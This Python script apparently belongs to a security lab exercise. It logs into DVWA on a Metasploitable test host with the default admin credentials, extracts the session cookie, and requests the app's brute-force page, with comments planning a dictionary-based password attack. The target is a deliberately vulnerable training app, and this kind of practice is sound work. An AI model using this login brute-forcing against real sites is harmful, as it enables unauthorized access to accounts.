from requests import *

#make sure to set target IP to 'metasploitable' in /etc/hosts

#go to dvwa
link = "http://metasploitable/dvwa/" #for future dev, select the web app in metasploitable to test in menu driven program
r = get(link, allow_redirects=False)
print("Reached:", r.url)
print("Status Code:", r.status_code)

location = r.headers["Location"] #where the requests would've redirected to
print("Redirecting to:", location)

#login to dvwa and get authenticated cookie
payload = {'username':'admin', 'password':'password', 'Login':'Login'}
r = post(link+location, data=payload, allow_redirects=False)
print("Logging in...")
location = r.headers["Location"]
set_cookie = r.headers["Set-Cookie"]
phpsessid = (set_cookie.split("PHPSESSID=")[1]).split(";")[0] #authenticated cookie
security = set_cookie.split("security=")[1]
print("Response:", r.text)
print("[+] Logged In!")
print("[+] Status Code:", format(r.status_code))
referer = r.headers["Location"]

#bruteforce
request_headers = {'Referer': link+referer}
cookie = {'PHPSESSID':phpsessid, 'security':'low'} #for future dev, set the security level in menu driven program
param = {'username':'Admin', 'password':'password', 'Login':'Login'} #for future dev, read credentials from a dictionary
r = get("http://metasploitable/dvwa/vulnerabilities/brute",
params = param,
headers = request_headers,
cookies = cookie,
)

print("Bruteforce Target:", r.url)
print("Status Code:", r.status_code)
print("Response:", r.text)
